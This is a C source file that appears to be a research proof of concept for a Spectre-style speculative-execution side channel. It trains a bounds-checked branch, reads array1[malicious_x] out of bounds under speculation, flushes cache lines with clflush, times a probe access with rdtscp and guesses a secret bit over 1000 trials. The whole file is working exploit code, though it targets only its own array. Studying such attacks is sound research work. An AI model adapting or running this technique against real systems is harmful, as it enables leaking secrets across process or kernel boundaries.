//produce 867 verified!
#include <stdio.h>
#include <time.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif
/*secret(array1[malicious_x]) is in cache, Ni is not in cache*/

#define LOADS_NUM 1
#define N_NUM 1
#define I_NUM 50
#define SAMPLE_NUM 1
#define TEST_NUM 1000
#define THRESHOLD 178

int     N[20][16]; //N[N[N[N[N[N[5][0]][0]][0]][0]][0]][0]
int     malicious_x = 100;
uint8_t array1[101];
uint8_t unuse[128];
uint8_t p[64 * LOADS_NUM + 1]; //64 * #loads in branch
uint8_t unsed3[128];
int     e[I_NUM][16];
uint8_t unused[128];
uint8_t RANDOM_TEST_BITS[TEST_NUM] = {0,0,1,0,0,0,0,1,0,0,1,0,1,1,0,0,0,1,1,1,0,1,1,1,1,0,0,0,0,1,1,1,0,0,0,1,0,1,0,1,1,0,1,1,0,1,0,0,1,1,0,1,0,0,0,1,0,0,0,1,1,0,0,1,1,0,1,0,1,1,0,0,1,1,0,1,0,0,1,0,0,0,0,0,0,0,1,1,0,1,0,1,0,0,1,1,0,1,1,1,1,1,1,1,0,1,0,0,1,1,1,1,1,0,0,0,0,1,1,0,0,1,1,1,1,1,1,1,1,1,1,1,0,0,0,1,1,1,0,0,1,1,1,0,0,1,0,1,0,1,0,1,0,0,0,1,0,0,1,0,0,0,0,1,0,0,1,0,0,1,0,1,0,0,1,1,1,0,1,0,1,1,0,0,0,0,0,0,1,0,0,1,0,1,1,0,1,1,1,1,1,1,0,0,0,0,0,1,0,1,1,0,0,0,0,0,1,1,1,1,1,0,1,0,1,0,1,0,1,1,0,0,1,0,1,1,0,1,1,1,1,0,1,0,1,1,1,0,1,0,0,0,0,0,1,1,0,1,0,1,1,1,1,0,1,0,0,0,0,0,1,1,0,1,0,0,1,1,1,1,0,0,0,0,0,1,1,0,1,1,1,1,1,0,0,0,0,1,1,0,1,0,1,0,0,1,1,1,0,1,0,1,0,0,0,0,1,0,1,1,1,1,0,1,1,0,0,0,1,0,0,0,0,1,0,0,1,1,1,1,0,0,1,0,0,0,1,0,1,1,0,0,0,1,0,1,1,1,0,1,0,1,0,0,0,1,1,0,1,1,1,1,1,1,0,1,0,0,0,0,0,0,1,1,0,1,1,1,1,1,1,1,1,1,1,1,0,0,1,1,0,1,0,0,1,1,0,1,0,1,0,1,0,0,1,0,1,1,0,1,1,0,0,1,1,0,0,0,0,1,1,1,0,1,0,0,0,0,0,0,1,1,0,0,1,1,1,1,1,1,0,0,1,1,1,0,0,0,0,1,1,0,1,1,0,0,0,0,1,0,1,1,1,0,1,1,1,1,1,0,1,0,1,0,0,1,1,0,0,0,0,1,0,1,0,0,1,1,1,0,0,0,0,1,0,1,1,1,1,1,1,1,1,1,0,1,0,0,0,0,1,0,1,0,1,1,1,0,1,0,0,1,0,0,0,0,0,1,1,1,1,0,0,0,0,0,1,1,1,0,0,1,1,0,1,1,1,1,1,1,1,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,1,1,1,0,0,1,0,1,1,1,0,1,1,0,1,0,0,1,0,1,0,1,0,0,1,0,1,1,0,0,0,0,0,0,0,0,1,1,0,1,1,0,0,1,1,0,1,1,1,1,0,1,1,0,0,1,1,1,1,1,1,1,0,0,1,0,0,0,1,0,0,0,0,1,1,0,0,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,0,1,0,0,1,0,1,1,0,0,0,1,0,0,1,0,0,1,1,1,1,1,0,1,1,1,0,1,0,0,1,1,0,0,0,0,1,1,1,1,1,0,0,1,0,0,1,1,0,1,1,1,1,0,1,1,1,0,1,0,0,0,0,1,0,1,1,0,0,1,0,0,1,0,0,0,1,0,1,1,0,0,0,1,1,1,1,0,1,0,0,0,0,0,0,0,0,1,1,0,0,1,1,1,0,1,0,0,0,1,0,1,1,1,0,0,0,0,0,0,1,0,1,1,1,1,0,0,1,0,1,1,0,1,0,1,1,0,0,0,0,1,1,0,0,1,0,0,1,1,0,0,0,1,0,0,0,0,0,1,1,1,0,1,0,0,1,0,1,1,0,0,1,0,0,0,1,0,1,1,0,1,1,0,0,0,0,1,0,1,1,0,1,1,0,0,0,1,0,0,1,1,0,0,0,0,1,1,1,1,1,0,1,1,1,0,0,1,1,0,0,0,1,0,1,0,1,1,1,0,1,1,0,0,0,0,1,1,0,1,0,1,0,1,1,0,0,1,1,0,0,0,1,0,1,0,0,1,1,1,0,0,1,1,0,1,1,1,0,1,1,1,1,0,0,1,0,1,0,1,1,1,0,1,0,0,1,1,1,1,0,0,0,0,1,1,1,1,1,1,0,0,1,1,0,1,1,0,1,0,1,0,0,1,1,1,0,1,0,0,0,0,1,0,0,0,1,0,0,0};

void maccess(void* p) {
     __asm__ __volatile__("movq (%0), %%rax\n"
        :
        : "c"(p)
        : "rax");
}

void victim(size_t x){
    if(x < N[0][0]){
        register uint8_t secret = array1[x]; //use malicous_x to access secret
        /* some loads */
        volatile register uint8_t* addr1 = p + secret * 64;
	    register uint8_t temp1 = *addr1;
    }
}

int main(){
    srand((int)time(NULL) + 8);
    register int startTime, endTime;
    int junk = 0;

    N[0][0] = 16;
    for(int i = N_NUM - 1; i > 0; i--)
	    N[i][0] = i - 1;

    array1[1] = 0;
    int correct = 0;
    array1[100] = 1; 
    size_t training_x = 1, x;
    register uint8_t temp;

    for(int t = 0; t < TEST_NUM; t++){
	    array1[100] = RANDOM_TEST_BITS[t];
	    int totalTime = 0, guess = -1;
	    _mm_mfence();
	    for(int s = SAMPLE_NUM; s > 0; s--){
		    for(int i = 5; i >= 0; i--){
                p[64] = 1;
                for(int j = 0; j < I_NUM; j++)
                    e[j][0] = 1;

                _mm_mfence();

                for(int j = 0; j < N_NUM; j++)
                    _mm_clflush(&N[j][0]);

                _mm_mfence();
                
                for(int j = 0; j < I_NUM; j++)
                    _mm_clflush(&e[j][0]);

                _mm_mfence();
                
                for(int k = 1; k <= LOADS_NUM; k++)
                    _mm_clflush(&p[64 * k]);

                maccess(&array1[100]);
                maccess(&p[0]);
                _mm_mfence();
                /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
                /* Avoid jumps in case those tip off the branch predictor */
                x = ((i % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
                x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
                x = training_x ^ (x & (malicious_x ^ training_x));

                _mm_mfence();
                startTime = __rdtscp(&junk);
                victim(x);
                endTime = __rdtscp(&junk) - startTime;
                _mm_mfence();
		    }
		    totalTime += endTime;
	    }
	    totalTime /= SAMPLE_NUM;
	    guess = totalTime > THRESHOLD ? 1 : 0;
	    printf("guess %d, secret %d, avgTime %d\n", guess, array1[100], totalTime);
	    if(guess == array1[100]) correct++;
    }
    printf("correct_num: %d\n", correct);
    return 0;
}
